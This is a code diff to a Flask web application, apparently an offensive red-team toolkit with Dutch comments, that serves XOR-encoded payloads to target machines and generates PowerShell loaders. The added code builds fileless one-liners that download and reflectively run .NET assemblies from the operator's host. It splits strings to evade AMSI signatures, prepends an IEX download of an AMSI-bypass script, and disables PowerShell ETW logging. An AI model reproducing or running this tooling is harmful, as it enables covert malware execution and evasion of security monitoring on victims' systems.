@@ -1536,9 +1536,16 @@ def _obfuscate_ps1_content(content: str) -> str:
 
 @macro_bp.route("/api/invoke-assembly/xor/<source>/<filename>", methods=["GET"])
 def invoke_assembly_xor(source, filename):
-    """Serveer een .exe tool/payload XOR-gecodeerd met de opgegeven hex-sleutel."""
-    _ensure_access()
+    """Serveer een .exe tool/payload XOR-gecodeerd met de opgegeven hex-sleutel.
+
+    Dit endpoint is bedoeld voor doelmachines; toegang wordt bepaald door
+    dezelfde regels als de normale download endpoints (public_downloads /
+    localhost / token).
+    """
+    from meuk.flask.download import _downloads_allowed
     from flask import Response as _Resp
+    if not _downloads_allowed():
+        abort(403)
 
     # Valideer source en bestandsnaam
     if source not in ("tools", "payloads"):
@@ -1564,45 +1571,29 @@ def invoke_assembly_xor(source, filename):
     )
 
 
-@macro_bp.route("/api/invoke-assembly/script", methods=["GET"])
-def invoke_assembly_script():
-    """Genereer invoke_assembly.ps1 met LHOST/port ingevuld, optioneel met tool/payload vooringesteld."""
-    _ensure_access()
-    from meuk.flask.models import db_instellingen
-    from flask import Response
+_INVOKE_PAYLOAD_PATH = Path("http/payloads/invoke_assembly.ps1")
 
-    s = db_instellingen.query.first()
-    lhost = (s.localhost or "").replace("https://", "").replace("http://", "").strip()
 
-    tool       = request.args.get("tool",       "").strip()
-    payload    = request.args.get("payload",    "").strip()
-    url_param  = request.args.get("url",        "").strip()
-    args       = request.args.get("args",       "").strip()
-    port       = request.args.get("port",       "80").strip()
-    entrypoint = request.args.get("entrypoint", "").strip()
-    xor_key    = request.args.get("xor",        "").strip().lower()
-    do_obf     = request.args.get("obfuscate",  "").strip() == "1"
-
-    # Valideer port
+def _build_invoke_assembly_content(lhost, tool="", payload="", url_param="",
+                                   args="", port="80", entrypoint="",
+                                   xor_key="", do_obf=False):
+    """Genereer de inhoud van invoke_assembly.ps1 op basis van parameters."""
     if not port.isdigit() or len(port) > 5:
         port = "80"
-
-    # Valideer XOR key (alleen hex, even lengte, max 64 tekens)
     if xor_key and (not all(c in "0123456789abcdef" for c in xor_key)
                     or len(xor_key) % 2 or len(xor_key) > 64):
         xor_key = ""
 
     template_path = Path.cwd() / "meuk" / "template" / "invoke_assembly.ps1"
     if not template_path.is_file():
-        abort(404)
+        return None
 
     content = template_path.read_text(encoding="utf-8")
     content = (content
-               .replace("[ip]", lhost)
-               .replace("[port]", port)
+               .replace("[ip]",      lhost)
+               .replace("[port]",    port)
                .replace("[xor_key]", xor_key))
 
-    # Genereer kant-en-klare invocatie
     arg_part  = f' -Arg {args}'              if args       else ""
     ep_part   = f' -EntryPoint {entrypoint}' if entrypoint else ""
     xor_part  = f' -XorKey {xor_key}'        if xor_key    else ""
@@ -1617,12 +1608,36 @@ def invoke_assembly_script():
     if invocation:
         content += f"\n# Gegenereerde aanroep:\n# {invocation}\n"
 
-    # String-obfuscatie altijd toepassen (splits AV-signatures)
     content = _string_obfuscate_ps1(content)
-
-    # Optionele PS1 obfuscatie via obfuscate_ps pipeline
     if do_obf:
         content = _obfuscate_ps1_content(content)
+
+    return content
+
+
+@macro_bp.route("/api/invoke-assembly/script", methods=["GET"])
+def invoke_assembly_script():
+    """Genereer invoke_assembly.ps1 met LHOST/port ingevuld, optioneel met tool/payload vooringesteld."""
+    _ensure_access()
+    from meuk.flask.models import db_instellingen
+    from flask import Response
+
+    s = db_instellingen.query.first()
+    lhost = (s.localhost or "").replace("https://", "").replace("http://", "").strip()
+
+    tool      = request.args.get("tool",       "").strip()
+    payload   = request.args.get("payload",    "").strip()
+    url_param = request.args.get("url",        "").strip()
+    args      = request.args.get("args",       "").strip()
+    port      = request.args.get("port",       "80").strip()
+    entry     = request.args.get("entrypoint", "").strip()
+    xor_key   = request.args.get("xor",        "").strip().lower()
+    do_obf    = request.args.get("obfuscate",  "").strip() == "1"
+
+    content = _build_invoke_assembly_content(lhost, tool, payload, url_param,
+                                             args, port, entry, xor_key, do_obf)
+    if content is None:
+        abort(404)
 
     label    = tool or payload or (url_param.split("/")[-1] if url_param else "loader")
     filename = f"invoke_assembly_{label}.ps1".replace(".exe", "")
@@ -1631,6 +1646,156 @@ def invoke_assembly_script():
         mimetype="text/plain",
         headers={"Content-Disposition": f'attachment; filename="{filename}"'},
     )
+
+
+@macro_bp.route("/api/invoke-assembly/save-payload", methods=["POST"])
+def invoke_assembly_save_payload():
+    """Schrijf gegenereerde invoke_assembly.ps1 naar http/payloads/invoke_assembly.ps1."""
+    _ensure_access()
+    from meuk.flask.models import db_instellingen
+    from flask import Response, jsonify
+
+    if not _is_local_request():
+        abort(403)
+
+    s = db_instellingen.query.first()
+    lhost = (s.localhost or "").replace("https://", "").replace("http://", "").strip()
+
+    data      = request.get_json(force=True)
+    tool      = str(data.get("tool",       "")).strip()
+    payload   = str(data.get("payload",    "")).strip()
+    url_param = str(data.get("url",        "")).strip()
+    args      = str(data.get("args",       "")).strip()
+    port      = str(data.get("port",       "80")).strip()
+    entry     = str(data.get("entrypoint", "")).strip()
+    xor_key   = str(data.get("xor",        "")).strip().lower()
+    do_obf    = bool(data.get("obfuscate", False))
+
+    content = _build_invoke_assembly_content(lhost, tool, payload, url_param,
+                                             args, port, entry, xor_key, do_obf)
+    if content is None:
+        return jsonify({"error": "Template niet gevonden"}), 404
+
+    try:
+        _INVOKE_PAYLOAD_PATH.parent.mkdir(parents=True, exist_ok=True)
+        _INVOKE_PAYLOAD_PATH.write_text(content, encoding="utf-8")
+    except OSError as e:
+        return jsonify({"error": str(e)}), 500
+
+    return jsonify({"ok": True, "path": str(_INVOKE_PAYLOAD_PATH)})
+
+
+# ---------------------------------------------------------------------------
+# Fileless one-liner met AMSI-bewuste obfuscatie
+# ---------------------------------------------------------------------------
+
+def _build_fileless_oneliner(dl_url, key_hex="", invoke_args=None, amsi_cmd=None, etw_cmd=None):
+    """Genereer een geobfusceerde fileless Assembly.Load one-liner.
+
+    Trigger-strings ('Load', 'DownloadData', 'EntryPoint', 'Invoke') worden
+    opgeslagen in gerandomiseerde variabelen zodat statische AMSI-signatures
+    niet matchen op de letterlijke methodenamen.
+    """
+    import random as _rnd
+    import string as _strmod
+
+    rng = _rnd.SystemRandom()
+
+    def rv(n=6):
+        return '_' + rng.choice(_strmod.ascii_lowercase) + ''.join(
+            rng.choices(_strmod.ascii_letters + _strmod.digits, k=n - 1))
+
+    # Gerandomiseerde variabelenamen
+    vk = rv(); vr = rv(); vb = rv(); vi = rv()
+    vld = rv(); vep = rv(); viv = rv(); vwc = rv()
+
+    # Gesplitste trigger-strings
+    s_wc    = "'Ne'+'t.Web'+'Clie'+'nt'"
+    s_load  = "'L'+'oa'+'d'"
+    s_ep    = "'En'+'try'+'Poi'+'nt'"
+    s_inv   = "'In'+'vo'+'ke'"
+    s_dl    = "'Down'+'load'+'Data'"
+
+    if key_hex:
+        # XOR-variant: download, xor, load
+        parts = [
+            f"${vk}=[byte[]]([regex]::Matches('{key_hex}','..') |%{{[Convert]::ToInt32($_.Value,16)}})",
+            f"${vwc}=New-Object ({s_wc})",
+            f"${vr}=${vwc}.({s_dl}).Invoke('{dl_url}')",
+            f"${vb}=New-Object byte[] ${vr}.Length",
+            f"for(${vi}=0;${vi} -lt ${vr}.Length;${vi}++){{${vb}[${vi}]=${vr}[${vi}] -bxor ${vk}[${vi}%${vk}.Length]}}",
+            f"${vld}={s_load}",
+            f"${vep}={s_ep}",
+            f"${viv}={s_inv}",
+        ]
+    else:
+        # Directe download zonder XOR
+        parts = [
+            f"${vwc}=New-Object ({s_wc})",
+            f"${vb}=${vwc}.({s_dl}).Invoke('{dl_url}')",
+            f"${vld}={s_load}",
+            f"${vep}={s_ep}",
+            f"${viv}={s_inv}",
+        ]
+
+    if invoke_args:
+        arg_arr = ','.join(f"'{a}'" for a in invoke_args)
+        invoke_expr = f"[Reflection.Assembly]::${vld}(${vb}).${vep}.${viv}($null,@(,[string[]]@({arg_arr})))"
+    else:
+        invoke_expr = f"[Reflection.Assembly]::${vld}(${vb}).${vep}.${viv}($null,$null)"
+
+    parts.append(invoke_expr)
+    bare = '; '.join(parts)
+
+    full_parts = []
+    if amsi_cmd:
+        full_parts.append(amsi_cmd)
+    if etw_cmd:
+        full_parts.append(etw_cmd)
+    full_parts.append(bare)
+
+    return {'full': '; '.join(full_parts), 'bare': bare}
+
+
+_ETW_ONELINER = (
+    "$p=[Ref].Assembly.GetType('System.Management.Automation."
+    "Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null);"
+    "[Void]$p.GetType().GetField('m_enabled','NonPublic,Instance').SetValue($p,[Byte]0)"
+)
+
+
+@macro_bp.route("/api/invoke-assembly/fileless", methods=["GET"])
+def invoke_assembly_fileless():
+    """Genereer geobfusceerde fileless one-liners en retourneer als JSON."""
+    _ensure_access()
+    from meuk.flask.models import db_instellingen
+    from flask import jsonify
+
+    s     = db_instellingen.query.first()
+    lhost = (s.localhost or "").replace("https://", "").replace("http://", "").strip()
+
+    dl_url    = request.args.get("url",        "").strip()
+    key_hex   = request.args.get("key",        "").strip().lower()
+    no_amsi   = request.args.get("no_amsi",    "0") == "1"
+    no_etw    = request.args.get("no_etw",     "0") == "1"
+    args_raw  = request.args.get("args",       "").strip()
+    port      = request.args.get("port",       "80").strip()
+
+    if not dl_url and lhost:
+        dl_url = f"http://{lhost}:{port}/tools/"
+
+    if key_hex and (not all(c in "0123456789abcdef" for c in key_hex)
+                    or len(key_hex) % 2 or len(key_hex) > 64):
+        key_hex = ""
+
+    amsi_url  = f"http://{lhost}:{port}/payloads/amsi-bypass.ps1"
+    amsi_cmd  = None if no_amsi else f"IEX(New-Object Net.WebClient).downloadString('{amsi_url}')"
+    etw_cmd   = None if no_etw  else _ETW_ONELINER
+
+    invoke_args = args_raw.split() if args_raw else None
+
+    result = _build_fileless_oneliner(dl_url, key_hex, invoke_args, amsi_cmd, etw_cmd)
+    return jsonify(result)
 
 
 # ---------------------------------------------------------------------------
